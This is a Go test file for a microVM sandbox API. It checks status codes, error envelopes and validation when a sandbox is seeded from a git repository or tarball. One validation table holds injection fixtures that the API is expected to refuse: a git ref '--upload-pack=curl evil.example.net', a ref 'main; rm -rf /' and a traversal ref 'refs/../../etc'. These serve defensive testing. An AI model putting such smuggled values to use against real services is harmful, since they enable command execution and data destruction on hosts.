package api

import (
	"context"
	"errors"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/pablofdezr/microvm/internal/api/apitypes"
	"github.com/pablofdezr/microvm/internal/sandbox"
	"github.com/pablofdezr/microvm/internal/source"
)

// seedFromPreparer answers every Prepare the same way, which is all this layer
// needs: what is under test is the shape of a request and the wire form of a
// refusal, not fetching.
type seedFromPreparer struct {
	err error
}

func (p *seedFromPreparer) Prepare(context.Context, source.Request) (source.Prepared, error) {
	if p.err != nil {
		return nil, p.err
	}
	return &seedFromArchive{}, nil
}

type seedFromArchive struct{}

func (seedFromArchive) Manifest() source.Manifest {
	return source.Manifest{
		Entries: []source.Entry{{Path: "main.py", Size: 6, Mode: "0644"}},
		Files:   1,
		Bytes:   6,
	}
}

func (seedFromArchive) Result() source.Result {
	return source.Result{
		Type:        source.TypeGit,
		URLRedacted: "https://github.example.com/acme/widgets.git",
		Ref:         "main",
		Commit:      "9f2b1c4e7a3d5f8091b2c3d4e5f60718293a4b5c",
	}
}

func (seedFromArchive) Close() error { return nil }

func (seedFromArchive) Write(ctx context.Context, w source.Writer) error {
	return w.WriteFile(ctx, "main.py", strings.NewReader("x = 1\n"), "0644")
}

// The reply reports what the sandbox was seeded from, redacted, so a sandbox
// found later can be traced back to the code inside it.
func TestCreateWithASourceReportsIt(t *testing.T) {
	h := newHarness(t, sandbox.WithSource(&seedFromPreparer{}))

	resp := h.do(t, "POST", "/v1/sandboxes", map[string]any{
		"image":  "python",
		"source": map[string]any{"type": "git", "url": "https://github.example.com/acme/widgets.git", "ref": "main"},
	})
	if resp.StatusCode != http.StatusCreated {
		t.Fatalf("status = %d, want 201: %s", resp.StatusCode, bodyOf(t, resp))
	}

	sb := decode[apitypes.Sandbox](t, resp)
	if sb.Source == nil {
		t.Fatal("the sandbox does not report its source")
	}
	if sb.Source.Type != apitypes.SandboxSourceTypeGit {
		t.Errorf("type = %q, want git", sb.Source.Type)
	}
	if sb.Source.Commit == nil || *sb.Source.Commit == "" {
		t.Error("the resolved commit is missing, which is the only field that means the same thing tomorrow")
	}
	if strings.Contains(sb.Source.UrlRedacted, "?") {
		t.Errorf("url_redacted carries a query string: %q", sb.Source.UrlRedacted)
	}
}

// A sandbox created without a source has no empty source object on it: a caller
// reading this back should see the shape they sent.
func TestCreateWithoutASourceOmitsIt(t *testing.T) {
	h := newHarness(t)
	if sb := h.createSandbox(t); sb.Source != nil {
		t.Errorf("source = %+v, want absent", *sb.Source)
	}
}

// Every refusal decided before a byte leaves the host is one code and one
// message. Told apart they would be a port scanner with the host's routing table.
func TestARefusedSourceIsOneBadRequest(t *testing.T) {
	tests := []struct {
		name string
		err  error
	}{
		{"fetching is off", nil}, // no preparer at all
		{"the host is not allowlisted", source.ErrNotPermitted},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			var opts []sandbox.Option
			if tc.err != nil {
				opts = append(opts, sandbox.WithSource(&seedFromPreparer{err: tc.err}))
			}
			h := newHarness(t, opts...)

			resp := h.do(t, "POST", "/v1/sandboxes", map[string]any{
				"image":  "python",
				"source": map[string]any{"type": "tarball", "url": "https://elsewhere.example.net/app.tar.gz"},
			})
			if resp.StatusCode != http.StatusBadRequest {
				t.Fatalf("status = %d, want 400: %s", resp.StatusCode, bodyOf(t, resp))
			}
			body := decode[apitypes.ErrorEnvelope](t, resp)
			if body.Error.Code != CodeSourceNotPermitted {
				t.Errorf("code = %q, want %q", body.Error.Code, CodeSourceNotPermitted)
			}
			if body.Error.Type != apitypes.ErrorTypeInvalidRequestError {
				t.Errorf("type = %q, want invalid_request_error", body.Error.Type)
			}
			if len(h.mgr.List()) != 0 {
				t.Error("a sandbox exists for a source that was refused")
			}
		})
	}
}

// An origin that was reached and misbehaved is a 502 api_error, not a 400: the
// URL may be fine and the origin may answer in a minute, which is the reaction
// api_error already asks a client for.
func TestAnUnusableSourceIsABadGateway(t *testing.T) {
	tests := []struct {
		name  string
		err   error
		stage string
	}{
		{"the origin answered badly", source.ErrFetchFailed, "fetch"},
		{"the archive is not one", source.ErrInvalidArchive, "expand"},
		{"it is past the operator's cap", source.ErrTooLarge, "expand"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			h := newHarness(t, sandbox.WithSource(&seedFromPreparer{err: tc.err}))

			resp := h.do(t, "POST", "/v1/sandboxes", map[string]any{
				"image":  "python",
				"source": map[string]any{"type": "tarball", "url": "https://codeload.example.com/app.tar.gz"},
			})
			if resp.StatusCode != http.StatusBadGateway {
				t.Fatalf("status = %d, want 502: %s", resp.StatusCode, bodyOf(t, resp))
			}
			body := decode[apitypes.ErrorEnvelope](t, resp)
			if body.Error.Code != CodeSourceFetchFailed {
				t.Errorf("code = %q, want %q", body.Error.Code, CodeSourceFetchFailed)
			}
			if body.Error.Type != apitypes.ErrorTypeApiError {
				t.Errorf("type = %q, want api_error", body.Error.Type)
			}
			// The stage is named, because it says whose problem it is.
			if !strings.Contains(body.Error.Message, tc.stage) {
				t.Errorf("message %q does not name the %s stage", body.Error.Message, tc.stage)
			}
		})
	}
}

// The sandbox's own writable layer, which is smaller than the operator's caps.
// A request error naming the fields that would fix it, rather than a 502 about
// somebody else's server.
func TestASourceTooBigForTheSandboxNamesTheFields(t *testing.T) {
	h := newHarness(t, sandbox.WithSource(&seedFromPreparer{
		err: &sandbox.SeedTooLargeError{Bytes: 500 << 20, Limit: 96 << 20, LayerMiB: 128, MemMiB: 128},
	}))

	resp := h.do(t, "POST", "/v1/sandboxes", map[string]any{
		"image":   "python",
		"mem_mib": 128,
		"source":  map[string]any{"type": "tarball", "url": "https://codeload.example.com/app.tar.gz"},
	})
	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400: %s", resp.StatusCode, bodyOf(t, resp))
	}
	body := decode[apitypes.ErrorEnvelope](t, resp)
	if body.Error.Code != CodeParameterInvalid {
		t.Errorf("code = %q, want %q", body.Error.Code, CodeParameterInvalid)
	}
	for _, want := range []string{"mem_mib", "disk_mib"} {
		if !strings.Contains(body.Error.Message, want) {
			t.Errorf("message %q does not name %s", body.Error.Message, want)
		}
	}
}

// A failed write is ours, not the caller's URL: a 500, and nothing about the
// origin.
func TestAFailedSeedWriteIsAnInternalError(t *testing.T) {
	h := newHarness(t, sandbox.WithSource(&seedFromPreparer{
		err: &sandbox.SeedError{Stage: sandbox.SeedWrite, Err: errors.New("the guest went away")},
	}))

	resp := h.do(t, "POST", "/v1/sandboxes", map[string]any{
		"image":  "python",
		"source": map[string]any{"type": "tarball", "url": "https://codeload.example.com/app.tar.gz"},
	})
	if resp.StatusCode != http.StatusInternalServerError {
		t.Fatalf("status = %d, want 500: %s", resp.StatusCode, bodyOf(t, resp))
	}
	body := decode[apitypes.ErrorEnvelope](t, resp)
	if strings.Contains(body.Error.Message, "guest went away") {
		t.Errorf("the reply quotes our internals: %q", body.Error.Message)
	}
}

// The shape rules, which are this layer's whole job. Every one of them is refused
// before the core is called: a field belonging to the other type is an error and
// not a field quietly dropped, because a source that disregards half of what was
// asked for seeds the wrong project.
func TestSourceParamsAreValidated(t *testing.T) {
	tests := []struct {
		name     string
		source   map[string]any
		wantCode string
		wantPara string
	}{
		{
			name:     "no type",
			source:   map[string]any{"url": "https://example.com/app.tar.gz"},
			wantCode: CodeParameterMissing, wantPara: "source.type",
		},
		{
			name:     "a type nobody implements",
			source:   map[string]any{"type": "svn", "url": "https://example.com/app.tar.gz"},
			wantCode: CodeParameterInvalid, wantPara: "source.type",
		},
		{
			name:     "no url",
			source:   map[string]any{"type": "tarball"},
			wantCode: CodeParameterMissing, wantPara: "source.url",
		},
		{
			name:     "a url longer than the field allows",
			source:   map[string]any{"type": "tarball", "url": "https://example.com/" + strings.Repeat("a", 2048)},
			wantCode: CodeParameterInvalid, wantPara: "source.url",
		},
		{
			name: "a ref on a tarball",
			source: map[string]any{
				"type": "tarball", "url": "https://example.com/app.tar.gz", "ref": "main",
			},
			wantCode: CodeParameterInvalid, wantPara: "source.ref",
		},
		{
			name: "a depth on a tarball",
			source: map[string]any{
				"type": "tarball", "url": "https://example.com/app.tar.gz", "depth": 1,
			},
			wantCode: CodeParameterInvalid, wantPara: "source.depth",
		},
		{
			name: "a credential on a tarball",
			source: map[string]any{
				"type": "tarball", "url": "https://example.com/app.tar.gz", "credential_ref": "ci",
			},
			wantCode: CodeParameterInvalid, wantPara: "source.credential_ref",
		},
		{
			name: "strip_components on a git source",
			source: map[string]any{
				"type": "git", "url": "https://example.com/r.git", "strip_components": 1,
			},
			wantCode: CodeParameterInvalid, wantPara: "source.strip_components",
		},
		{
			name: "strip_components past the bound",
			source: map[string]any{
				"type": "tarball", "url": "https://example.com/app.tar.gz",
				"strip_components": source.MaxStripComponents + 1,
			},
			wantCode: CodeParameterInvalid, wantPara: "source.strip_components",
		},
		{
			name: "a negative strip_components",
			source: map[string]any{
				"type": "tarball", "url": "https://example.com/app.tar.gz", "strip_components": -1,
			},
			wantCode: CodeParameterInvalid, wantPara: "source.strip_components",
		},
		{
			name: "a depth of nothing",
			source: map[string]any{
				"type": "git", "url": "https://example.com/r.git", "depth": 0,
			},
			wantCode: CodeParameterInvalid, wantPara: "source.depth",
		},
		{
			// The one that matters: the ref becomes an argument to git, and a value
			// beginning with a dash is a caller choosing what runs on the host.
			name: "a ref that is an option",
			source: map[string]any{
				"type": "git", "url": "https://example.com/r.git", "ref": "--upload-pack=curl evil.example.net",
			},
			wantCode: CodeParameterInvalid, wantPara: "source.ref",
		},
		{
			name: "a ref with a space in it",
			source: map[string]any{
				"type": "git", "url": "https://example.com/r.git", "ref": "main; rm -rf /",
			},
			wantCode: CodeParameterInvalid, wantPara: "source.ref",
		},
		{
			name: "a ref that walks up",
			source: map[string]any{
				"type": "git", "url": "https://example.com/r.git", "ref": "refs/../../etc",
			},
			wantCode: CodeParameterInvalid, wantPara: "source.ref",
		},
		{
			name: "a credential name that is not one",
			source: map[string]any{
				"type": "git", "url": "https://example.com/r.git", "credential_ref": "ci key",
			},
			wantCode: CodeParameterInvalid, wantPara: "source.credential_ref",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			// A preparer that would accept anything, so a pass here would be this
			// layer letting the value through rather than the core refusing it.
			h := newHarness(t, sandbox.WithSource(&seedFromPreparer{}))

			resp := h.do(t, "POST", "/v1/sandboxes",
				map[string]any{"image": "python", "source": tc.source})
			if resp.StatusCode != http.StatusBadRequest {
				t.Fatalf("status = %d, want 400: %s", resp.StatusCode, bodyOf(t, resp))
			}
			body := decode[apitypes.ErrorEnvelope](t, resp)
			if body.Error.Code != tc.wantCode {
				t.Errorf("code = %q, want %q", body.Error.Code, tc.wantCode)
			}
			if body.Error.Param == nil || *body.Error.Param != tc.wantPara {
				t.Errorf("param = %v, want %q", body.Error.Param, tc.wantPara)
			}
		})
	}
}

// The values a caller may legitimately send reach the core unchanged. Without
// this the validation above could pass by refusing everything.
func TestValidSourceParamsReachTheCore(t *testing.T) {
	tests := []struct {
		name   string
		params apitypes.SandboxSourceParams
		want   source.Request
	}{
		{
			name: "a tarball with a wrapper directory",
			params: apitypes.SandboxSourceParams{
				Type: "tarball", Url: " https://codeload.example.com/app.tar.gz ",
				StripComponents: ptr(1),
			},
			want: source.Request{
				Type: source.TypeTarball,
				URL:  "https://codeload.example.com/app.tar.gz",
				// Trimmed, and the strip carried through.
				StripComponents: 1,
			},
		},
		{
			name: "a private repository at a commit",
			params: apitypes.SandboxSourceParams{
				Type: "git", Url: "https://github.example.com/acme/widgets.git",
				Ref:           ptr(strings.Repeat("a", 40)),
				Depth:         ptr(50),
				CredentialRef: ptr("github-ci"),
			},
			want: source.Request{
				Type: source.TypeGit, URL: "https://github.example.com/acme/widgets.git",
				Ref: strings.Repeat("a", 40), Depth: 50, CredentialRef: "github-ci",
			},
		},
		{
			name:   "a tag",
			params: apitypes.SandboxSourceParams{Type: "git", Url: "https://x.example.com/r.git", Ref: ptr("v1.2.3")},
			want:   source.Request{Type: source.TypeGit, URL: "https://x.example.com/r.git", Ref: "v1.2.3"},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got, apiErr := validateSource(&tc.params)
			if apiErr != nil {
				t.Fatalf("validateSource: %v", apiErr)
			}
			if *got != tc.want {
				t.Errorf("request = %+v, want %+v", *got, tc.want)
			}
		})
	}
}

func bodyOf(t *testing.T, resp *http.Response) string {
	t.Helper()
	body := decode[apitypes.ErrorEnvelope](t, resp)
	return body.Error.Code + ": " + body.Error.Message
}

// A ttl shorter than the seed takes is the caller's number. Answered as a bad
// request naming it, rather than as the 500 a failed write becomes: nothing on this
// host went wrong, and paging an operator for it is the wrong outcome.
func TestATTLThatExpiredDuringTheSeedNamesTheField(t *testing.T) {
	h := newHarness(t, sandbox.WithSource(&seedFromPreparer{
		err: &sandbox.SeedExpiredError{TTL: time.Second, Elapsed: 3 * time.Second},
	}))

	resp := h.do(t, "POST", "/v1/sandboxes", map[string]any{
		"image":       "python",
		"ttl_seconds": 1,
		"source":      map[string]any{"type": "tarball", "url": "https://codeload.example.com/app.tar.gz"},
	})
	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400: %s", resp.StatusCode, bodyOf(t, resp))
	}
	body := decode[apitypes.ErrorEnvelope](t, resp)
	if body.Error.Code != CodeParameterInvalid {
		t.Errorf("code = %q, want %q", body.Error.Code, CodeParameterInvalid)
	}
	if !strings.Contains(body.Error.Message, "ttl") {
		t.Errorf("message %q does not name the field that would fix it", body.Error.Message)
	}
}

// The node's fetch slots are full. Capacity and a 429, which is what every SDK
// already backs off on, and not a bad request: the URL is fine and shortly this
// will work.
func TestANodeAlreadyFetchingAsManyAsItWillIsCapacity(t *testing.T) {
	h := newHarness(t, sandbox.WithSource(&seedFromPreparer{
		err: &sandbox.SeedError{Stage: sandbox.SeedFetch, Err: &sandbox.SeedBusyError{Max: 8}},
	}))

	resp := h.do(t, "POST", "/v1/sandboxes", map[string]any{
		"image":  "python",
		"source": map[string]any{"type": "tarball", "url": "https://codeload.example.com/app.tar.gz"},
	})
	if resp.StatusCode != http.StatusTooManyRequests {
		t.Fatalf("status = %d, want 429: %s", resp.StatusCode, bodyOf(t, resp))
	}
	body := decode[apitypes.ErrorEnvelope](t, resp)
	if body.Error.Code != CodeNodeAtCapacity {
		t.Errorf("code = %q, want %q", body.Error.Code, CodeNodeAtCapacity)
	}
	if body.Error.Type != apitypes.ErrorTypeCapacityError {
		t.Errorf("type = %q, want %q", body.Error.Type, apitypes.ErrorTypeCapacityError)
	}
}
